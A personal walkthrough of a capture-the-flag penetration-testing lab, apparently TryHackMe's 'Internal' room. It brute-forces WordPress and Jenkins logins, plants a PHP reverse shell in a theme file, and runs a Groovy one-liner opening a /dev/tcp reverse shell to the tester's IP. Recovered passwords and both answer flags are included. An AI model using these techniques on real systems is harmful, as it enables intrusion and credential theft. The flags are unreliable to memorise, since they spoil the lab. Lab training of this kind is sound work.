---
Penetration Testing Challenge
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/222b3e855f88a482c1267748f76f90e0.jpeg)

###  Pre-engagement Briefing 

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in three weeks. 

Scope of Work

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Ensure that you modify your hosts file to reflect internal.thm
    Any tools or techniques are permitted in this engagement
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope

(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnsecurity eCPPT or career as a penetration tester in the field.


Note - this room can be completed without Metasploit

**Writeups will not be accepted for this room.**

### Deploy and Engage the Client Environment 

 Having accepted the project, you are provided with the client assessment environment.  Secure the User and Root flags and submit them to the dashboard as proof of exploitation.



```
┌──(kali㉿kali)-[~]
└─$ ping 10.10.97.105                      
PING 10.10.97.105 (10.10.97.105) 56(84) bytes of data.
64 bytes from 10.10.97.105: icmp_seq=1 ttl=63 time=202 ms
64 bytes from 10.10.97.105: icmp_seq=2 ttl=63 time=202 ms
^C
--- 10.10.97.105 ping statistics ---
3 packets transmitted, 2 received, 33.3333% packet loss, time 2006ms
rtt min/avg/max/mdev = 201.531/201.670/201.809/0.139 ms

ttl=63 so linux
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                             
[sudo] password for kali: 
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts         
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.91.93     raz0rblack raz0rblack.thm
10.10.234.77    lab.enterprise.thm
10.10.96.58     source
10.10.59.104    CONTROLLER.local
10.10.54.75     acmeitsupport.thm
10.10.102.33    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
10.10.179.221   development.smag.thm
10.10.87.241    mafialive.thm
10.10.97.105    internal.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

┌──(kali㉿kali)-[~]
└─$ ping internal.thm
PING internal.thm (10.10.97.105) 56(84) bytes of data.
64 bytes from internal.thm (10.10.97.105): icmp_seq=1 ttl=63 time=199 ms
64 bytes from internal.thm (10.10.97.105): icmp_seq=2 ttl=63 time=197 ms
64 bytes from internal.thm (10.10.97.105): icmp_seq=3 ttl=63 time=210 ms
^C
--- internal.thm ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms
rtt min/avg/max/mdev = 196.600/201.695/209.705/5.733 ms


┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O internal.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 11:52 EDT
Nmap scan report for internal.thm (10.10.97.105)
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
9220/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/28%OT=22%CT=1%CU=33593%PV=Y%DS=2%DC=T%G=Y%TM=63346DF
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=FD%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=
OS:M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4
OS:B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   195.37 ms 10.11.0.1
2   195.56 ms 10.10.97.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.92 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O internal.thm


┌──(kali㉿kali)-[~]
└─$ feroxbuster --url http://internal.thm -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://internal.thm
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      375l      964w    10918c http://internal.thm/
301      GET        9l       28w      311c http://internal.thm/blog => http://internal.thm/blog/
200      GET      375l      964w    10918c http://internal.thm/index.html
301      GET        9l       28w      317c http://internal.thm/javascript => http://internal.thm/javascript/
301      GET        9l       28w      317c http://internal.thm/phpmyadmin => http://internal.thm/phpmyadmin/
301      GET        9l       28w      316c http://internal.thm/wordpress => http://internal.thm/wordpress/
301      GET        9l       28w      324c http://internal.thm/javascript/jquery => http://internal.thm/javascript/jquery/
301      GET        0l        0w        0c http://internal.thm/blog/index.php => http://internal.thm/blog/
301      GET        9l       28w      321c http://internal.thm/phpmyadmin/doc => http://internal.thm/phpmyadmin/doc/
200      GET       98l      278w    22486c http://internal.thm/phpmyadmin/favicon.ico
200      GET       26l      359w        0c http://internal.thm/phpmyadmin/index.php
301      GET        9l       28w      320c http://internal.thm/phpmyadmin/js => http://internal.thm/phpmyadmin/js/
[###########>--------] - 37s    20491/36912   30s     found:11      errors:437    
[#########>----------] - 37s    20511/41526   38s     found:12      errors:437    
[#########>----------] - 37s    20543/41526   38s     found:12      errors:437    
[#########>----------] - 37s    20643/41526   38s     found:12      errors:437    
[#########>----------] - 37s    20656/41526   38s     found:12      errors:437    
[#########>----------] - 37s    20705/41526   38s     found:12      errors:439    
[##########>---------] - 37s    20790/41526   38s     found:12      errors:444    
[##########>---------] - 37s    20820/41526   38s     found:12      errors:444    
[##########>---------] - 37s    20874/41526   37s     found:12      errors:445    
[##########>---------] - 37s    20935/41526   37s     found:12      errors:445    
[##########>---------] - 37s    20970/41526   37s     found:12      errors:445    
[##########>---------] - 37s    21040/41526   37s     found:12      errors:454    
[##########>---------] - 37s    21088/41526   37s     found:12      errors:455    
301      GET        9l       28w      324c http://internal.thm/phpmyadmin/locale => http://internal.thm/phpmyadmin/locale/

wordpress enumeration

Browsing /blog confirms our assumption, this is a Wordpress blog. Let’s enumerate the users with wpscan: 


┌──(kali㉿kali)-[~]
└─$ wpscan --url http://internal.thm/blog -e u                             
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://internal.thm/blog/ [10.10.97.105]
[+] Started: Wed Sep 28 12:08:23 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <====================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Sep 28 12:08:39 2022
[+] Requests Done: 54
[+] Cached Requests: 7
[+] Data Sent: 13.943 KB
[+] Data Received: 472.771 KB
[+] Memory used: 204.387 MB
[+] Elapsed time: 00:00:16

According to WPScan, the only user is admin. Let’s try to brute force the password, using the bruteforce feature of WPScan: 


┌──(kali㉿kali)-[~]
└─$ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://internal.thm/blog/ [10.10.97.105]
[+] Started: Wed Sep 28 12:11:12 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:07 <===================================> (137 / 137) 100.00% Time: 00:00:07

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                       
Trying admin / bratz1 Time: 00:06:34 <                                   > (3885 / 14348277)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Sep 28 12:18:11 2022
[+] Requests Done: 4028
[+] Cached Requests: 35
[+] Data Sent: 2.033 MB
[+] Data Received: 2.311 MB
[+] Memory used: 281.613 MB
[+] Elapsed time: 00:06:58

admin:my2boys

Wordpress admin connection

Login (http://internal.thm/blog/wp-admin/) is successful with admin:my2boys and we now have the ability to modify the templates PHP source code. This will be convenient to write a reverse shell.

In the web interface, go to “Appearance > Theme Editor > 404.php” and replace the PHP code with a PHP reverse shell (e.g. http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

Open a listener (rlwrap nc -nlvp 4444) and call the template (http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php). 


internal.thm/blog/wp-content/themes/twentyseventeen/404.php

rev shell


┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 4444                                
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.97.105.
Ncat: Connection from 10.10.97.105:35004.
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:23:30 up 35 min,  0 users,  load average: 0.01, 0.10, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

Lateral move (www-data to aubreanna)

There is an interesting file in the /opt directory: 

www-data@internal:/$ whoami
whoami
www-data
www-data@internal:/$ cd /opt
cd /opt
www-data@internal:/opt$ ls
ls
containerd  wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
www-data@internal:/opt$ su aubreanna
su aubreanna
Password: bubb13guM!@#123

aubreanna@internal:/opt$ whoami
whoami
aubreanna
aubreanna@internal:/opt$ cd /home/aubreanna
cd /home/aubreanna
aubreanna@internal:~$ ls -la
ls -la
total 56
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
-rwx------ 1 aubreanna aubreanna    7 Aug  3  2020 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna 3771 Apr  4  2018 .bashrc
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .cache
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .gnupg
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 .local
-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
drwx------ 2 aubreanna aubreanna 4096 Aug  3  2020 .ssh
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
aubreanna@internal:~$ cat user.txt
cat user.txt
THM{int3rna1_fl4g_1}

Check privileges

To read the root flag, we will need a privilege escalation. Unfortunately, aubreanna is not in the sudoers. 

aubreanna@internal:~$ sudo -l
sudo -l
[sudo] password for aubreanna: bubb13guM!@#123

Sorry, user aubreanna may not run sudo on internal.

Jenkins

There is an interesting file in aubreanna’s home folder that tells us Jenkins is running on port 8080: 

aubreanna@internal:~$ cat jenkins.txt
cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080

We confirm that the service is only available to localhost. 

aubreanna@internal:~$ netstat -tan | grep 8080
netstat -tan | grep 8080
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN 

There are several indications that docker is available on the target, and as the Jenkins documentation (https://www.jenkins.io/doc/book/installing/) explains how to install Jenkins with docker, we can assume that this is how Jenkins has been installed. If not a rabbit hole, this could be a way to elevate our privileges to root. Worth trying…

To make Jenkins available to us (instead of just localhost), we can use socat to redirect ports. As socat is not available on the target, we have to transfer it. Here is how you can do it: 

on Kali:

┌──(kali㉿kali)-[~]
└─$ which socat                                                            
/usr/bin/socat
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ cd /usr/bin/           
                                                                                                                  
┌──(kali㉿kali)-[/usr/bin]
└─$ python3 -m http.server                 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

On the target:

aubreanna@internal:~$ cd /tmp/
cd /tmp/
aubreanna@internal:/tmp$ wget http://10.11.81.220:8000/socat
wget http://10.11.81.220:8000/socat
--2022-09-28 16:32:50--  http://10.11.81.220:8000/socat
Connecting to 10.11.81.220:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 411656 (402K) [application/octet-stream]
Saving to: ‘socat’

socat               100%[===================>] 402.01K   255KB/s    in 1.6s    

2022-09-28 16:32:52 (255 KB/s) - ‘socat’ saved [411656/411656]

aubreanna@internal:/tmp$ chmod +x socat
chmod +x socat
aubreanna@internal:/tmp$ ./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
[1] 2229
aubreanna@internal:/tmp$ ./socat: error while loading shared libraries: libssl.so.3: cannot open shared object file: No such file or directory


[1]+  Exit 127                ./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80



aubreanna@internal:/tmp$ ifconfig
ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:e7ff:fe6f:6570  prefixlen 64  scopeid 0x20<link>
        ether 02:42:e7:6f:65:70  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 420 (420.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 18  bytes 1324 (1.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.97.105  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::c1:a5ff:fedc:480f  prefixlen 64  scopeid 0x20<link>
        ether 02:c1:a5:dc:48:0f  txqueuelen 1000  (Ethernet)
        RX packets 152173  bytes 18229104 (18.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 89869  bytes 32833666 (32.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1802  bytes 170270 (170.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1802  bytes 170270 (170.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethf6a9272: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::e806:79ff:fe7a:4c95  prefixlen 64  scopeid 0x20<link>
        ether ea:06:79:7a:4c:95  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 532 (532.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 33  bytes 2470 (2.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

so much better a ssh tunnel

┌──(kali㉿kali)-[~]
└─$ ssh -L 6767:172.17.0.2:8080 aubreanna@internal.thm
The authenticity of host 'internal.thm (10.10.97.105)' can't be established.
ED25519 key fingerprint is SHA256:seRYczfyDrkweytt6CJT/aBCJZMIcvlYYrTgoGxeHs4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'internal.thm' (ED25519) to the list of known hosts.
aubreanna@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 28 16:44:18 UTC 2022

  System load:  0.0               Processes:              116
  Usage of /:   63.8% of 8.79GB   Users logged in:        0
  Memory usage: 35%               IP address for eth0:    10.10.97.105
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56

now go to

http://localhost:6767

and can see jenkins login

using burpsuite and hydra

or inspecting page network


┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 6767 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-28 12:52:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://localhost:6767/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[6767][http-post-form] host: localhost   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-28 12:52:54

:) found it   admin:spongebob

login

Reverse shell in docker

Now that we have an admin access to Jenkins, we can run commands, and we’ll ultimately exploit this to have a reverse shell.

Start by running a listener (on your machine): 

Now we have Jenkins password. Use it login and click on “manage jenkins” and find “script console”.

    Jenkins has lovely Groovy script console that permits anyone to run arbitrary Groovy scripts inside the Jenkins master runtime. Groovy is a very powerful language which offers the ability to do practically anything Java can do. 

r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.11.81.220/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()


priv esc

┌──(kali㉿kali)-[~]
└─$ rlwrap nc -nlvp 5555                                
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.10.97.105.
Ncat: Connection from 10.10.97.105:45048.
cd /opt
ls -la
total 12
drwxr-xr-x 1 root root 4096 Aug  3  2020 .
drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
-rw-r--r-- 1 root root  204 Aug  3  2020 note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
su root
su: must be run from a terminal
python3 -c "import pty;pty.spawn('/bin/bash')"
/bin/bash: python3: command not found
python -c "import pty;pty.spawn('/bin/bash')"
  File "<string>", line 1
    "import
          ^
SyntaxError: EOL while scanning string literal
/bin/bash -i
bash: cannot set terminal process group (6): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@jenkins:/opt$ su root
su root
su: must be run from a terminal
jenkins@jenkins:/opt$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
bash: python3: command not found
jenkins@jenkins:/opt$ python -c "import pty;pty.spawn('/bin/bash')"
python -c "import pty;pty.spawn('/bin/bash')"
jenkins@jenkins:/opt$ su root
su root
Password: tr0ub13guM!@#123

su: Authentication failure

i see cz is a container (docker) so in the other rev shell where is aubreanna

aubreanna@internal:~$ su root
Password: tr0ub13guM!@#123
root@internal:/home/aubreanna# cd /root
root@internal:~# ls -la
total 48
drwx------  7 root root 4096 Aug  3  2020 .
drwxr-xr-x 24 root root 4096 Aug  3  2020 ..
-rw-------  1 root root  193 Aug  3  2020 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Aug  3  2020 .cache
drwx------  3 root root 4096 Aug  3  2020 .gnupg
drwxr-xr-x  3 root root 4096 Aug  3  2020 .local
-rw-------  1 root root 1071 Aug  3  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Aug  3  2020 .ssh
-rw-r--r--  1 root root   22 Aug  3  2020 root.txt
drwxr-xr-x  3 root root 4096 Aug  3  2020 snap
root@internal:~# cat root.txt
THM{d0ck3r_d3str0y3r}


```

![[Pasted image 20220928112542.png]]

![[Pasted image 20220928114706.png]]


User.txt Flag
*THM{int3rna1_fl4g_1}*




Root.txt Flag
*THM{d0ck3r_d3str0y3r}*



[[Relevant]]